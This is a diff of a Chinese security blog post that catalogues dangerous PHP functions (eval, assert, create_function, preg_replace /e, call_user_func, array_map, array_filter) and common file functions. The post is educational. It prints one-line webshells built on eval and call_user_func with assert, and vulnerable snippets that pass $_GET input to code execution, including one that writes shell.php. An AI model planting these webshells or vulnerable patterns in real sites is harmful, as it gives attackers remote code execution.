@@ -120,12 +120,12 @@
 
 
 
-<meta name="description" content="php危险函数总结什么是危险函数​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。 $_GET             $POST $_fILES $_COOKIE $_REQUEST         $_SERVER         $_SES">
+<meta name="description" content="php危险函数总结什么是危险函数​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。 1234567$_GET            $POST$_fILES$_COOKIE$_REQUEST		$_SERVER		$_SESSION  执行任意代">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP危险函数总结">
 <meta property="og:url" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/index.html">
 <meta property="og:site_name" content="Shu1L&#39;s blog">
-<meta property="og:description" content="php危险函数总结什么是危险函数​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。 $_GET             $POST $_fILES $_COOKIE $_REQUEST         $_SERVER         $_SES">
+<meta property="og:description" content="php危险函数总结什么是危险函数​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。 1234567$_GET            $POST$_fILES$_COOKIE$_REQUEST		$_SERVER		$_SESSION  执行任意代">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218123543.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218125837.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/02/php-wei-xian-han-shu-zong-jie/QQ%E6%88%AA%E5%9B%BE20200218130753.png">
@@ -434,13 +434,9 @@
 
       
         <h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p>
-<pre><code>$_GET            
-$POST
-$_fILES
-$_COOKIE
-$_REQUEST        
-$_SERVER        
-$_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>_GET            </span><br><span class="line"><span class="meta"><span class="meta-keyword">$POST</span></span></span><br><span class="line"><span class="symbol">$</span>_fILES</span><br><span class="line"><span class="symbol">$</span>_COOKIE</span><br><span class="line"><span class="symbol">$</span>_REQUEST		</span><br><span class="line"><span class="symbol">$</span>_SERVER		</span><br><span class="line"><span class="symbol">$</span>_SESSION</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
 <li>eval函数</li>
 <li>assert函数</li>
 <li>create_function 函数</li>
@@ -455,52 +451,30 @@ $_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行�
 <p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
 <p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
 <p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
-<pre><code>&lt;?php
-$string = &quot;beautiful&quot;;
-$time = &quot;winter&quot;;
-$str = &#39;This is a $string $time morning!&#39;;
-eval(&quot;\$str = \&quot;$str\&quot;;&quot;);
-echo $str;
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$string</span> = <span class="string">"beautiful"</span><span class="comment">;</span></span><br><span class="line"><span class="variable">$time</span> = <span class="string">"winter"</span><span class="comment">;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">'This is a <span class="variable">$string</span> <span class="variable">$time</span> morning!'</span><span class="comment">;</span></span><br><span class="line">eval(<span class="string">"\<span class="variable">$str</span> = \"</span><span class="variable">$str</span>\<span class="string">";"</span>)<span class="comment">;</span></span><br><span class="line">echo <span class="variable">$str</span><span class="comment">;</span></span><br><span class="line"></span><br><span class="line">输出为：This is a beautiful winter morning!</span><br></pre></td></tr></table></figure>
 
-输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
+<p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
 <h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p>
 <p>如果参数为字符串，它将会被assert()当做php代码来执行</p>
 <p>版本只能为：5.x</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>
-    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fo</span></span>&#123;</span><br><span class="line">	file_put_contents(<span class="string">"shell.php"</span>, <span class="string">"&lt;?php phpinfo() ?&gt;"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$func=$_GET[<span class="string">"func"</span>];</span><br><span class="line">assert(<span class="string">"$func()"</span>);</span><br></pre></td></tr></table></figure>
+
 <p>如果我们提交?func=fo，即可写入shell.php</p>
 <h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p>
 <p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
 <p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
-<pre><code>&lt;?php
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">$str2=<span class="string">'echo'</span>.$a.<span class="string">'"test"'</span>.$id.<span class="string">";"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$f1 = create_function(<span class="string">'$a'</span>, $str2);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$f1(<span class="string">"abc"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
-$id=$_GET[&#39;id&#39;];
-
-$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;
-
-$f1 = create_function(&#39;$a&#39;, $str2);
-
-$f1(&quot;abc&quot;);
-?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
 <h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
 <p>示例1：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/test/e"</span>, $_GET[<span class="string">"a"</span>], <span class="string">"this is a test"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>当我们所要匹配的字符串中含有test时</p>
 <p>我们直接传入参数？a=phpinfo()即可执行代码。</p>
 <p>示例2：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">'test("\1")'</span>, $_GET[<span class="string">"h"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p>
 <h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p>
 <p>调用一个回调函数处理字符串,</p>
@@ -513,21 +487,13 @@ $f1(&quot;abc&quot;);
 
 <p><strong>示例2：</strong></p>
 <p>一句话木马：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@call_user_func(<span class="string">"assert"</span>,$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p>
 <h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p>
 <p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$func=$_GET[<span class="string">"func"</span>];</span><br><span class="line"></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">$array[<span class="number">0</span>]=$cmd;</span><br><span class="line"></span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>
-
-<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
  <img src="QQ截图20200218133234.png"  />
 
 
@@ -535,15 +501,8 @@ $f1(&quot;abc&quot;);
 <h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p>
 <p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p>
 <p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">$array1=<span class="keyword">array</span>($cmd);</span><br><span class="line"></span><br><span class="line">$func=$_GET[<span class="string">'func'</span>];</span><br><span class="line"></span><br><span class="line">array_filter($array1,$func);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
 <img src="QQ截图20200218202542.png" style="zoom:67%;" />
 
 <h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p>
@@ -553,17 +512,10 @@ $f1(&quot;abc&quot;);
 <h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p>
 <ul>
 <li><p><strong>Fopen()</strong></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span>
-<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
-<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$handle=fopen(<span class="string">"http://www.baidu.com"</span>,<span class="string">"rb"</span>);</span><br><span class="line">$contents=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($handle)) &#123;</span><br><span class="line">	$contents .= fread($handle, <span class="number">8192</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">fclose($handle);</span><br><span class="line"><span class="keyword">echo</span> $contents;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<span class="token punctuation">}</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
+
+
 </li>
 </ul>
 <ul>
@@ -582,22 +534,20 @@ $f1(&quot;abc&quot;);
 </ul>
 <p>copy() 函数拷贝文件</p>
 <p>语法：copy(source,destination)</p>
-<pre><code>&lt;?php
-echo copy(&quot;source.txt&quot;,&quot;target.txt&quot;);
-?&gt;</code></pre><p>输出1。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> copy(<span class="string">"source.txt"</span>,<span class="string">"target.txt"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>输出1。</p>
 <ul>
 <li><p><strong>File_get_contents()/File_put_contents</strong></p>
 <ul>
 <li><p>file_get_contents() 把整个文件读入一个字符串中。</p>
 <p>语法：file_get_contents(path,include_path,context,start,max_length)</p>
-<pre><code>&lt;?php
-echo file_get_contents(&quot;test.txt&quot;);
-?&gt;</code></pre></li>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> file_get_contents(<span class="string">"test.txt"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>file_put_contents() 函数把一个字符串写入文件中。</p>
 <p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p>
-<pre><code>&lt;?php
-echo file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);
-?&gt;</code></pre></li>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> file_put_contents(<span class="string">"sites.txt"</span>,<span class="string">"Runoob"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
 <li><p><strong>File()</strong></p>
@@ -605,9 +555,8 @@ echo file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);
 <li><p>file() 函数把整个文件读入一个数组中。</p>
 <p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p>
 <p>语法：file(path,include_path,context)</p>
-<pre><code>&lt;?php
-print_r(file(&quot;test.txt&quot;));
-?&gt;</code></pre></li>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">print_r(file(<span class="string">"test.txt"</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
 <li><p><strong>Fopen()</strong></p>
@@ -615,13 +564,8 @@ print_r(file(&quot;test.txt&quot;));
 <li><p>open() 函数打开一个文件或 URL。</p>
 <p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p>
 <p>语法：fopen(filename,mode,include_path,context)</p>
-<pre><code>&lt;?php
-$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);
-$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);
-$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);
-$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);
-$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);
-?&gt;</code></pre></li>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"test.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"/home/test/test.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"/home/test/test.gif"</span>,<span class="string">"wb"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"http://www.example.com/"</span>,<span class="string">"r"</span>);</span><br><span class="line">$file = <span class="keyword">fopen</span>(<span class="string">"ftp://user:password@example.com/test.txt"</span>,<span class="string">"w"</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
 <li><p><strong>Move_uploaded_file()</strong></p>
@@ -636,9 +580,8 @@ $file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;
 <ul>
 <li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p>
 <p>语法：readfile(filename,include_path,context)</p>
-<pre><code>&lt;?php
-echo readfile(&quot;test.txt&quot;);
-?&gt;</code></pre></li>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> readfile(<span class="string">"test.txt"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
 <li><p><strong>Rename()</strong></p>
@@ -646,9 +589,8 @@ echo readfile(&quot;test.txt&quot;);
 <li><p>rename() 函数重命名文件或目录。</p>
 <p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
 <p>语法：rename(oldname,newname,context)</p>
-<pre><code>&lt;?php
-rename(&quot;images&quot;,&quot;pictures&quot;);
-?&gt;</code></pre></li>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">rename(<span class="string">"images"</span>,<span class="string">"pictures"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
 <li><p><strong>Unlink()</strong></p>
@@ -656,17 +598,11 @@ rename(&quot;images&quot;,&quot;pictures&quot;);
 <li><p>unlink() 函数删除文件。</p>
 <p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
 <p>语法：unlink(filename,context)</p>
-<pre><code>&lt;?php
-$file = &quot;test.txt&quot;;
-if (!unlink($file))
-{
-echo (&quot;Error deleting $file&quot;);
-}
-else
-{
-echo (&quot;Deleted $file&quot;);
-}
-?&gt;</code></pre></li>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = <span class="string">"test.txt"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!unlink($file))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (<span class="string">"Error deleting $file"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (<span class="string">"Deleted $file"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
 </ul>
 </li>
 </ul>
